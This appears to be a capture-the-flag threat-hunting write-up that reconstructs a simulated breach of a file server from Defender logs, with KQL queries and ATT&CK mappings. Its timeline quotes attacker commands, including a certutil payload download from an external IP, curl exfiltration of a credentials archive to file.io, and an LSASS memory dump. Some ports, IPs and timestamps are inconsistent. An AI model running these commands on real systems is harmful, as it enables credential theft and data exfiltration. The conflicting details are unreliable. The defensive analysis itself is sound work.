# SOC Incident Investigation – Azuki Import/Export Compromise

**Analyst:** Steven Cruz  
**Source:** Cyber Range SOC Challenge  
**System:** azuki-fileserver01

---

## Overview
This investigation analyzes a simulated intrusion against Azuki Import/Export (梓貿易株式会社) as part of the Cargo Hold threat-hunting exercise in the Azuki Breach Saga.
The scenario provides participants with Microsoft Defender for Endpoint (MDE) telemetry from a compromised environment,
requiring analysts to identify attacker actions across the kill chain—from initial access to exfiltration and anti-forensics.

## Scenario Context
Attackers initially gained access to an Azuki workstation on November 19, establishing a foothold before going dormant for approximately 72 hours.
Upon returning, they conducted lateral movement toward high-value assets, staged data for exfiltration, deployed persistence mechanisms, and attempted to remove forensic evidence.

## Data Sources
All findings were derived exclusively from Microsoft Defender for Endpoint Advanced Hunting logs, including:

- DeviceProcessEvents

- DeviceFileEvents

- DeviceLogonEvents

- DeviceRegistryEvents

- DeviceNetworkEvents

No host access, file content review, or endpoint imaging was required; all conclusions were driven by log-based hunting and correlation.

## Scope of Investigation
The objective of this hunt was to:

- Identify attacker behaviors mapped to MITRE ATT&CK

- Validate compromised accounts, hosts, staging directories, toolsets, and exfiltration channels

- Interpret attacker methodology based solely on MDE telemetry

- Produce high-confidence answers for each step of the adversary workflow

This report documents each phase of the intrusion and the analytical steps taken to identify the Indicators of Compromise (IOCs) and behavioral patterns used throughout the attack.

---

# TIMELINE OF ATTACKER ACTIVITY

This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.

---

### Initial Access & Return Activity

Nov 19, 2025 7:10:42 PM

System: azuki-fileserver01

Account: fileadmin

Event: Successful remote logon from 10.10.1.204

Technique: Initial Access / Lateral Movement (T1021)

Nov 22, 2025 12:27:53 AM

System: azuki-sl

Account: kenji.sato

Event: External logon from 159.26.106.98

Technique: Initial Access (TA0001)

---

### Lateral Movement to File Server

Nov 22, 2025 12:11:14 AM

System: azuki-fileserver01

Account: fileadmin

Event: Remote logon from 10.0.8.4

Technique: Remote Services (T1021)

---

### System & Network Discovery
| Timestamp   | Command                 | Technique                        |
| ----------- | ----------------------- | -------------------------------- |
| 12:40:54 AM | `net share`             | Local Share Discovery (T1135)    |
| 12:42:01 AM | `net view \\10.1.0.188` | Remote Share Discovery (T1135)   |
| 12:40:09 AM | `whoami /all`           | Privilege Discovery (T1033)      |
| 12:42:46 AM | `ipconfig /all`         | Network Config Discovery (T1016) |

Device: azuki-fileserver01 — Account: fileadmin

---

### Defense Evasion

12:55:43 AM

Command: ``` attrib +h +s C:\Windows\Logs\CBS ```

Purpose: Hide staging folder

Technique: Hidden Files & Directories (T1564.001)

---

### Ingress Tool Transfer

12:58:24 AM

Command: `certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

Technique: Ingress Tool Transfer (T1105)

Device: azuki-fileserver01 — Account: fileadmin

---

### Collection & Data Staging

1:06:03 AM

Command: `xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`

Technique: Automated Collection (T1119)

1:07:53 AM

File Created: IT-Admin-Passwords.csv

Technique: Credentials Harvesting (T1552)

---

### Compression of Staged Data

1:25:31 AM

Command: `tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

Technique: Archive Collected Data (T1560.001)

---

### Credential Access

~2:24:47 AM

Command: `pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

Output: lsass.dmp memory dump

Technique: OS Credential Dumping (T1003.001)

---

### Exfiltration to Cloud Storage

2:06:08 AM

Command: `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

Technique: Exfiltration to Cloud Storage (T1567.002)

---

### Persistence Mechanism

Registry Modification Timestamp (from Query E)

Key Value: FileShareSync (Run key)

Payload: svchost.ps1

Technique: Registry Run Keys (T1547.001)

---

### Anti-Forensics / Cleanup

2:26:01 AM

File Deleted: ConsoleHost_history.txt

Technique: Clear Command History (T1070.003)

---

# EXECUTIVE SUMMARY

The Cargo Hold hunt provided telemetry from a live intrusion against Azuki Import/Export (梓貿易株式会社). Using only Microsoft Defender for Endpoint Advanced Hunting logs, this investigation successfully identified:

- The attacker’s return infrastructure

- Lateral movement to a file server

- Discovery of network resources and permissions

- Credential harvesting from LSASS memory

- Collection and staging of sensitive data

- Compression and exfiltration to a cloud service

- Setup of persistence, masquerading as legitimate components

- Cleanup actions designed to hinder forensic review

--- 

### Key Findings

| Category                 | Confirmed Findings                                                |
| ------------------------ | ----------------------------------------------------------------- |
| **Initial Access**       | Adversary re-entered via external IP (**159.26.106.98**)          |
| **Privilege Abuse**      | Compromised admin account: **fileadmin**                          |
| **High-Value Targeting** | File server accessed: **azuki-fileserver01**                      |
| **Credential Theft**     | LSASS dumped to `C:\Windows\Logs\CBS\lsass.dmp`                   |
| **Staging Location**     | Hidden directory: `C:\Windows\Logs\CBS\`                          |
| **Data Theft**           | Archive exfiltrated via **file.io** using `curl`                  |
| **Persistence**          | Registry autorun value: **FileShareSync** executing `svchost.ps1` |
| **Anti-Forensics**       | PowerShell history deleted (`ConsoleHost_history.txt`)            |

---

### Analyst Capabilities Demonstrated

| Skill Area               | Demonstration                                            |
| ------------------------ | -------------------------------------------------------- |
| Endpoint threat hunting  | Correlating multi-host attacker activity using MDE       |
| Log-driven investigation | Full kill-chain reconstruction from telemetry alone      |
| MITRE ATT&CK mapping     | 20 distinct techniques identified & aligned              |
| IOC extraction           | IPs, commands, filenames, registry values, staging paths |
| Forensics awareness      | Recognition of persistence and anti-forensic evidence    |
| Reporting quality        | Structured narrative suitable for SOC leadership         |

---

### Adversary Intent Assessment

The adversary’s actions indicate:

- Integrity & Confidentiality loss involving privileged credentials

- Targeted collection of sensitive business data

- Efforts to remain persistent and stealthy within the environment

- Ability to destroy evidence and hinder IR reconstruction

---

# Flag by Flag Detail

## FLAG 1 — INITIAL ACCESS: Return Connection Source

### Objective
Determine the source IP address used when the attacker returned to the environment after their initial access and 72-hour dwell period.

### Investigation Approach

Since the attacker originally compromised Azuki three days earlier (Port of Entry), we pivoted into endpoint logon telemetry — specifically:

- DeviceLogonEvents

- Filtering for systems containing “azuki” in their hostnames

- Looking for RemoteIP fields on successful logons

### Query Used

```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where ActionType contains "success"
| where RemoteIP != ""
| project Timestamp, DeviceName, AccountName, RemoteIP, ActionType, RemoteDeviceName 
```

### Evidence Observed

In the results, one logon stood out as the first return session linked to the second phase of the intrusion:

<img width="280" height="133" alt="image" src="https://github.com/user-attachments/assets/b90008ae-29e4-4f4f-b07a-806cbb74b880" />


```
Nov 22, 2025 12:27:53 AM
Device: azuki-sl
Account: kenji.sato
Remote IP: 159.26.106.98
```

This IP was not the same as the IP used during the original compromise, aligning with the brief’s expectations:

“infrastructure has changed — different IP than CTF 1”

### Analysis & Interpretation

This event confirms:

- The attacker reengaged with the compromised workstation

- A new external C2 host was used to avoid correlation with earlier activity

- The attacker retains valid credentials to access the system legitimately

This is a common obfuscation tactic to bypass static IOC blocking.

### Why This Matters

This behavior demonstrates:

- Persistence of access

- Likelihood of legitimate credential theft

- Intent to continue deeper into the environment

- A shift to operational execution from reconnaissance

This log event establishes the start of the active breach.

### MITRE ATT&CK Mapping

- TA0001 — Initial Access
- Valid Accounts (T1078)

### Final Flag Answer

` 159.26.106.98 `

---

##  FLAG 2 — LATERAL MOVEMENT: Compromised Device Name

### Objective

Determine which device the attacker targeted for lateral movement after re-entering the network — specifically the file server containing business-critical data.

### Investigation Approach

We pivoted to RDP usage because:

- Attackers commonly use MSTSC.exe (Remote Desktop)

- RDP generates clear DeviceLogonEvents

- Successful logons reveal pivot targets
→ especially when using compromised admin credentials

We filtered for logons originating from the initially compromised workstation.

### Query Used

```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where RemoteIP != ""
| order by Timestamp asc
```

We scanned results for:

- LogonSuccess

- RemoteIP sourced from an internal Azuki workstation

- Destination = a server-class device

### Evidence Observed

The following RDP session confirmed the lateral pivot:

<img width="686" height="60" alt="image" src="https://github.com/user-attachments/assets/34e8dd67-162e-4e7d-8378-8a8b4a845162" />

<img width="336" height="553" alt="image" src="https://github.com/user-attachments/assets/ffa2da4c-603f-4f6a-9158-53b5c75cb1da" />

```
Nov 19, 2025 7:10:42 PM
Device: azuki-fileserver01
Account: fileadmin
RemoteIP: 10.10.1.204 (source: azuki-sl)
```

This aligns perfectly with the scenario briefing:

attackers target file servers due to the high concentration of sensitive data

### Analysis & Interpretation

Key findings from this event:

- The attacker moved from workstation → high-value server

- The compromised account already had administrative privileges

- RDP activity strongly suggests interactive operator control

- The adversary immediately began exploring valuable data stores

This confirms compromise of the business file server.

### Why This Matters

- Provides insight into target selection and intent

- Confirms that the attacker can access confidential files

- Represents a material escalation of risk

- Establishes the next foothold in the kill chain

### MITRE ATT&CK Mapping

- TA0008 — Lateral Movement

- Remote Services: T1021

### Final Flag Answer

` azuki-fileserver01`

## FLAG 3 — LATERAL MOVEMENT: Compromised Administrator Account

### Objective

Identify which administrator account the attacker leveraged to log into the file server and continue the intrusion.

### Investigation Approach

Once we validated the attacker’s pivot to azuki-fileserver01, the next step was determining which credentials enabled that access.

We again used:

- DeviceLogonEvents
- Filtering for successful logons
- On the file server
- From a remote source
- During the attacker’s operational window

We specifically focused on admin-class accounts, since they align with targeted file access.

### Query Used

```
DeviceLogonEvents
| where DeviceName == "azuki-fileserver01"
| where LogonStatus == "Success"
| where RemoteIP != ""
| order by Timestamp asc
```
We reviewed logons during Nov 22 breach activity.

### Evidence Observed

An unmistakable authentication entry showed the attacker logging in using a privileged account:

<img width="275" height="137" alt="image" src="https://github.com/user-attachments/assets/56b3e85e-4cdb-40ce-9e85-bd9d7a67c6ca" />


```
Nov 22, 2025 12:38:49 AM
Device: azuki-fileserver01
Account: fileadmin
RemoteIP: 10.1.0.204
LogonSuccess
```

This was a different remote source than used during the initial foothold — further proving active lateral movement using valid credentials.

### Analysis & Interpretation

This event confirms:

- Compromised credentials for a privileged role
- Access to folders and shares storing sensitive business data
- The account likely possesses write permissions, enabling staging and persistence
- The attacker intentionally leveraged legitimate access pathways to avoid detection

This marks a significant expansion of access within the network.

### Why This Matters

Compromising this particular admin account:

- Enables data theft
- Allows persistent access to high-value locations
- Reduces detection likelihood by mimicking normal administrative traffic
- Represents a direct threat to data confidentiality

This event is a pivot point in the breach’s success.

### MITRE ATT&CK Mapping

- T1078 — Valid Accounts
- TA0008 — Lateral Movement

### Final Flag Answer

` fileadmin `

## FLAG 4 — DISCOVERY: Local Share Enumeration Command

### Objective

Determine the exact command the attacker used to enumerate local network shares on the compromised file server.

### Investigation Approach

After gaining access to azuki-fileserver01, the adversary needed to understand what data was available:

- Which directories were shared?
- What business data could be accessed?
- Where could staging occur?

We pivoted into process telemetry on the file server, filtering for:

- Windows administrative utilities
- Known share enumeration tools
→ particularly net.exe

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == @"fileadmin"
| where ProcessCommandLine contains "share"
| where FileName =~ "net.exe"
| order by Timestamp asc
```

### Evidence Observed

This key discovery command was observed:

<img width="278" height="119" alt="image" src="https://github.com/user-attachments/assets/ce4778f3-2455-4125-9292-16c2fc36fdfd" />


```
Nov 22, 2025 12:40:54 AM
Command: "net.exe" share
Device: azuki-fileserver01
Account: fileadmin
```

This aligns perfectly with behavior described in the incident brief.

### Analysis & Interpretation

This activity confirms:

- Attacker reconnaissance of local shared directories
- Searching for business-critical data repositories
- Establishment of which locations to target next for staging or exfil

This fits the early data-discovery stage of the intrusion.

### Why This Matters

Enumeration of local shares is a precursor to data theft.
It demonstrates:

- The attacker is preparing for collection
- They have sufficient privileges to enumerate shares
- They are actively scoping valuable internal directories

### MITRE ATT&CK Mapping

- Discovery: T1135 — Network Share Discovery

### Final Flag Answer

` "net.exe" share `

##
